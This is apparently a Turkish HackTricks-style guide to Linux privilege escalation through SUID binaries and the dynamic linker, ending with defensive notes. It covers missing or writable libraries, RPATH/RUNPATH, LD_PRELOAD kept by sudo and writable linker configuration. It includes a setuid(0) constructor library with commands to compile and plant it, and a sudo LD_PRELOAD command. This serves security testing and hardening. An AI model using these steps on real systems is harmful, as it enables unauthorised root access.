# SUID Shared Library ve Linker Abuse

SUID binary'leri genellikle doğrudan komut çalıştırma açısından incelenir, ancak özel SUID programları dynamic linker üzerinden de vulnerable olabilir. Yaygın tema basittir: ayrıcalıklı bir executable, daha düşük ayrıcalıklara sahip bir kullanıcının etkileyebileceği bir path veya configuration üzerinden code yükler.<sup>[[1]](#references)</sup>

Bu sayfa generic technique pattern'lerine odaklanır: eksik library'ler, writable library directory'leri, `RPATH`/`RUNPATH`, sudo üzerinden `LD_PRELOAD`, linker configuration ve SUID hardlink confusion.

## Hızlı Enumeration

Olağandışı SUID file'larını bulup bunların dynamic olarak linked olup olmadığını kontrol ederek başlayın:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Standart olmayan konumlara, özel uygulama yollarına, root tarafından sahip olunan ancak paket yöneticisi tarafından yönetilen dizinlerin dışında bulunan binary'lere ve yazılabilir dizinlerden yüklenen bağımlılıklara odaklanın.<sup>[[1]](#references)</sup>

Yararlı yazılabilirlik kontrolleri:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

Bazı özel SUID binary'leri mevcut olmayan bir shared object yüklemeye çalışır. Eksik yol attacker'ın kontrolündeki bir dizinin altındaysa binary, attacker tarafından sağlanan kodu effective user olarak yükleyebilir.<sup>[[1]](#references)</sup>

Başarısız library lookup işlemlerini `strace`'in syscall filtresiyle bulun:<sup>[[2]](#references)</sup>
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
Binary, `libexample.so` için yazılabilir bir path arıyorsa, minimal bir proof library constructor kullanabilir. Validation sırasında proof-of-impact'i zararsız tutun:<sup>[[6]](#references)</sup>
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Binary'nin yüklemeye çalıştığı tam dosya adıyla derleyin:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
Sömürülebilir koşul yalnızca kütüphanenin eksik olması değildir. Saldırgan, ayrıcalıklı loader'ın kabul edeceği bir yola uyumlu bir shared object yerleştirebilmelidir.<sup>[[1]](#references)</sup>

## Yazılabilir Kütüphane Dizini

Bazen tüm bağımlılıklar mevcut olur, ancak bunları çözümlemek için kullanılan dizinlerden biri yazılabilirdir. Bu, yüklenmiş bir kütüphanenin değiştirilmesine veya aynı ada sahip daha yüksek öncelikli bir kütüphanenin yerleştirilmesine olanak sağlayabilir.<sup>[[1]](#references)</sup>

Bağımlılık yollarını inceleyin:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Dizin yazılabilir durumdaysa laboratuvar ortamında kopyalama açısından güvenli bir yaklaşımla doğrulayın. Canlı bir host üzerinde system library’lerini değiştirmek, aynı anda başlatılan process’leri library sürümleri arasında tutarsız bir durumda bırakabilir.<sup>[[8]](#references)</sup>

## RPATH and RUNPATH

`RPATH` ve `RUNPATH`, loader’a library’leri nerede arayacağını bildiren dynamic-section girdileridir. Attacker tarafından yazılabilir dizinleri gösterdiklerinde SUID programlarında tehlikelidirler.<sup>[[1]](#references)</sup>

Bunları tespit edin:<sup>[[3]](#references)[[10]](#references)</sup>
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Riskli çıktı örneği:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
`/opt/app/lib` yazılabilir durumdaysa ve binary `libcustom.so` gerektiriyorsa, saldırgan buraya kötü amaçlı bir `libcustom.so` yerleştirebilir:<sup>[[1]](#references)</sup>
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` ve `RUNPATH` tüm çözümleme ayrıntılarında aynı değildir; ancak privilege-escalation incelemesi açısından pratik soru aynıdır: SUID binary, bir library name için attacker-writable bir directory arıyor mu?<sup>[[1]](#references)</sup>

## LD_PRELOAD, LD_LIBRARY_PATH ve SUID

Normal programlarda `LD_PRELOAD` ve `LD_LIBRARY_PATH`, shared object yüklemesini zorlayabilir veya etkileyebilir. SUID programlarında dynamic loader normalde secure-execution mode'a geçer ve tehlikeli environment variable'ları yok sayar.<sup>[[1]](#references)</sup>

Bu, kullanıcının `LD_PRELOAD` ayarlayabilmesi nedeniyle düz bir SUID binary'nin genellikle vulnerable olmadığı anlamına gelir:<sup>[[1]](#references)</sup>
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
Yaygın istisna, hedef komut için loader değişkenlerinin ayarlanmasına veya korunmasına izin veren bir sudo policy'dir. `sudo -l` çıktısında `env_keep+=LD_PRELOAD` veya `env_keep+=LD_LIBRARY_PATH` gibi girdileri inceleyin; hedef dynamically linked ise attacker-controlled code yükleyebilir:<sup>[[4]](#references)[[5]](#references)</sup>
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Bu durumları karıştırmayın; loader ve sudo policy kuralları bunları birbirinden ayırır:<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

- Normal bir SUID binary'ye karşı `LD_PRELOAD`: genellikle secure execution tarafından engellenir.
- sudo tarafından korunan `LD_PRELOAD`: potansiyel olarak exploitable.
- Writable bir path'te eksik `.so`: SUID binary bu path'i doğal olarak yüklediğinde exploitable.
- Writable bir directory'ye yönlendiren `RPATH`/`RUNPATH`: gerekli bir library kontrol edilebildiğinde exploitable.
- `/etc/ld.so.preload` veya linker config için write access: sistem genelini etkiler ve yüksek etkiye sahiptir.

## Linker Configuration

`ld.so`, linker cache ve `/etc/ld.so.preload` kullanır; `ldconfig` bu cache'i `/etc/ld.so.conf` ve buradan include edilen dosyalardan, genellikle `/etc/ld.so.conf.d/` içinden oluşturur.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Öncelikli kontroller:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Writable linker configuration is usually more serious than a single vulnerable SUID binary because it can affect many dynamically linked processes. `/etc/ld.so.preload` is especially dangerous because it can force a shared object into privileged processes.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

## SUID Hardlink Confusion

Hardlink'ler aynı SUID inode'unun birden fazla ad altında görünmesini sağlayabilir.<sup>[[9]](#references)</sup> Bu, ayrıcalıklı bir helper'ı gizlemek, cleanup işlemlerini karıştırmak veya naif path tabanlı incelemeyi atlatmak için kullanılabilir.

Birden fazla link'i olan SUID dosyalarını bulun:<sup>[[9]](#references)</sup>
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Aynı inode’a sahip tüm yolları inceleyin:<sup>[[9]](#references)</sup>
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
Abuse, bir hardlink'in izinleri değiştirmesi değildir. Abuse, path confusion'dır: ayrıcalıklı bir inode, defenders veya script'lerin beklemediği bir ad üzerinden erişilebilir olabilir.<sup>[[9]](#references)</sup> Daha ayrıntılı inode ve hardlink workflow'u için [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md) sayfasına bakın.

## Savunma Notları

- SUID binary'lerini mümkün olduğunca minimal, denetlenmiş ve package-managed tutun.
- Writable veya application-managed dizinleri gösteren `RPATH`/`RUNPATH` girdilerinden kaçının.<sup>[[1]](#references)[[8]](#references)</sup>
- Library dizinlerini root-owned ve regular user'lar tarafından writable olmayacak şekilde tutun.<sup>[[8]](#references)</sup>
- `LD_PRELOAD`, `LD_LIBRARY_PATH` veya benzer loader variable'larını sudo üzerinden korumayın.<sup>[[1]](#references)[[5]](#references)</sup>
- `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` ve beklenmeyen SUID file'larını monitor edin.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
- Hardlinked SUID file'larını review edin ve standard system path'lerinin dışındaki custom SUID wrapper'larını investigate edin.<sup>[[9]](#references)</sup>

## References

- [1] [ld.so(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [strace(1) — Linux manual page](https://man7.org/linux/man-pages/man1/strace.1.html)
- [3] [readelf (GNU Binary Utilities)](https://sourceware.org/binutils/docs/binutils/readelf.html)
- [4] [sudo(8) — Linux manual page](https://www.man7.org/linux/man-pages/man8/sudo.8.html)
- [5] [sudoers(5) — Linux manual page](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [6] [Common Attributes (GCC)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [7] [ldconfig(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [8] [Dynamic Linker Hardening (The GNU C Library)](https://www.sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [9] [Hard Links (GNU Findutils)](https://www.gnu.org/software/findutils/manual/html_node/find_html/Hard-Links.html)
- [10] [objdump (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/objdump.html)
{{#include ../../banners/hacktricks-training.md}}
